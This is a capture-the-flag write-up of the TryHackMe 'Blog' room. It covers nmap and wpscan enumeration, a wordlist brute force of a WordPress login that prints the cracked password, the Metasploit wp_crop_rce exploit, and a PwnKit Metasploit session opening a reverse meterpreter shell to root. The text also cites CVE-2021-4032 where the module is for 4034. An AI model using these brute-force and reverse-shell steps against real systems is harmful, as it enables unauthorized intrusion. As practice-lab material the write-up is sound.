---
title: /writeups/Blog
layout: post
permalink: /writeups/Blog
---
Writeup of THM Machine called <a href="https://tryhackme.com/room/blog">"Blog"</a>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!

Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole...

In order to get the blog to work with AWS, you'll need to add blog.thm to your /etc/hosts file.

Credit to Sq00ky for the root privesc idea ;) 
</pre></td></tr></tbody></table></code></pre></div></div>

<h1>Enumeration</h1>
<p>Obviously first thing I did was an nmap scan:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre></td><td class="rouge-code"><pre>$ nmap -T4 -A -sV blog.thm
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-04 15:42 CET
Nmap scan report for blog.thm < ip >
Host is up (0.069s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp   open     http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: Billy Joels IT Blog The IT blog
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
5906/tcp filtered rpas-c2
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
Host script results:
|_nbstat: NetBIOS name: BLOG, NetBIOS user: , NetBIOS MAC:(unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2024-02-04T14:42:59+00:00
| smb2-time: 
|   date: 2024-02-04T14:42:59
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
Nmap done: 1 IP address (1 host up) scanned in 19.93 seconds 
</pre></td></tr></tbody></table></code></pre></div></div>

I personally didn't even try to enumerate smb further, luckily, I saw in other writeups that it's a honeypot
<p>However, we can see, that on port 80 there's an http server<p>
<h1>HTTP</h1>

<img src="/images/BlogMain.png" alt="Wordpress Home site" />

We can see, that it is a wordpress blog, so I run wpscan (I removed boring stuff): 

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre></td><td class="rouge-code"><pre>┌──(silen㉿pop-os)-[~/Desktop/THM/Blog]
└─$ wpscan --url http://blog.thm -e u 
Interesting Finding(s):

[+] robots.txt found: http://blog.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%
 
[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
 |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>
 
[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <================================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:01
 
[i] User(s) Identified:
 
[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
 
[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
</pre></td></tr></tbody></table></code></pre></div></div>

<p>First of all, it tells us that the wordpress is running on version 5.0. Quick google search gets us CVE-2019-8943 to which, we need user login and password, but wpscan also helps us there as it gives us two usernames - "kwheel" and "bjoel". I decided to bruteforce them because I didn't have any other idea. Also, kwheel seemed to probably care less about her password than her son, so I tried to brute force her user first.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>┌──(silen㉿pop-os)-[~/Desktop/THM/Blog]
└─$ wpscan --url http://blog.thm -P /usr/share/wordlists/rockyou.txt -U kwheel -t 32
 
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - kwheel / <oz#mJ@y8C$vq6@>                                                                                                                                                                                                                
Trying kwheel / <oz#mJ@y8C$vq6@> Time: 00:00:46 <                                                                                                                                                              > (<37> / 14347272)  0.02%  ETA: ??:??:??
 
[!] Valid Combinations Found:
 | Username: kwheel, Password: <oz#mJ@y8C$vq6@>
</pre></td></tr></tbody></table></code></pre></div></div>
As you can see we found valid combination. 
<p>I mentioned CVE-2019-8943 before, it turns out, there is a metasploit module which we can use called "exploit/multi/http/wp_crop_rce"</p>
After setting up every option and running exploit, we gain a shell!

<h1>PrivEsc</h1>
I saw that there is nicer way (envolving reverse engineering) to do privelege escalation than I did, but I will show my simple way using metasploit modules.
<p>First module I run was "post/multi/manage/shell_to_meterpreter", which made it possible to use exploit suggester (post/multi/recon/local_exploit_suggester)<p/>
<p>Suggester tells us, that the system is vulnerable to CVE-2021-4032</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="rouge-code"><pre>msf6 post(multi/recon/local_exploit_suggester) > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec 
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set session 4
session => 4
msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set lhost tun0
lhost => 37.37.37.37
msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set lport 9898
lport => 9898
msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > exploit
 
[*] Started reverse TCP handler on 10.14.68.194:9898 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] Verify cleanup of /tmp/.pltvpwc
[+] The target is vulnerable.
[*] Writing '/tmp/.zbzpuhuxuf/huogglp/huogglp.so' (548 bytes) ...
[!] Verify cleanup of /tmp/.zbzpuhuxuf
[*] Sending stage (3045380 bytes) to 10.10.22.192
[+] Deleted /tmp/.zbzpuhuxuf/huogglp/huogglp.so
[+] Deleted /tmp/.zbzpuhuxuf/.vtxjvu
[+] Deleted /tmp/.zbzpuhuxuf
[*] Meterpreter session 5 opened (10.14.68.194:9898 -> 10.10.22.192:59766) at 2024-02-04 18:35:48 +0100

meterpreter > shell
Process 5384 created.
Channel 1 created.
whoami
root
</pre></td></tr></tbody></table></code></pre></div></div>
<p>After running which, we gain root access!</p>
<p>Now we can look for flag that is hidden in "/media/usb" and move to the next room :D</p>


Thank you for reading
